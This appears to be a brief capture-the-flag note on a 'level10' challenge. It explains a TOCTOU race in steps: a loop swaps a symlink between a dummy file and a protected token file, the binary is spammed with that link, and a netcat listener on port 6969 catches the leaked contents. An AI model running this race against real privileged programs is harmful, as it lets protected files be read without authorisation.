    After some research, this vulnerability is called TOCTOU (Time-Of-Check to Time-Of-Use)

    Here is a way to reproduce exploit:

    1.
    Need to create `tmp/file`
    Have a do while loop that makes symlink `/tmp/link/` from /tmp/file`
        And then overwrites symlink `/tmp/link` from `/home/user/level10/token`
    
    2.
    Open 2nd terminal that will run do while loop to spam `./level10 /tmp/link 127.0.0.1` in background
    (possibility to run multiple loops in parralel for better chances of breaching)
    
    3.
    Open 3rd terminal that listens on `nc -lk 6969`
